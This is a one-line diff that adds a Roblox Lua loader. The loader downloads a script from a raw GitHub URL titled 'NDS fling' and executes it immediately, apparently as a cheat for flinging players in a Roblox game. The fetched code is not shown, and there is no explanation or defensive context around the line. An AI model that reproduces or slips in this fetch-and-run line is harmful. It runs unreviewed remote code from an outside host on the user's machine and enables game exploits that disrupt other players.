@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HelloImWesty/west/refs/heads/main/NDS%20fling"))()
